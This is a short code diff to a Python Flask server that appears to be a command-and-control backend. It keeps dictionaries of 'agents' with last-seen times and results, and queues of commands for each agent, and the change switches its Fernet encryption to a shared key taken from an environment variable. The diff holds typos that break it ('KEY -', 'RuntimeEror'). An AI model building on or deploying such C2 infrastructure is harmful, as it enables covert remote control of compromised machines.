@@ -4,7 +4,12 @@ import datetime
 import os
 
 app = Flask(__name__)
-key = Fernet.generate_key()
+KEY - os.getenv("C2_SHARED_KEY")
+
+if not KEY:
+    raise RuntimeEror("C2_SHARED_KEY não definida")
+
+fernet = Fernet(KEY.encode())
 
 agents = {}  # {agent_id: {'last_seen': timestamp, 'results': []}}
 commands = {}  # {agent_id:['cmd1','cmd2']}
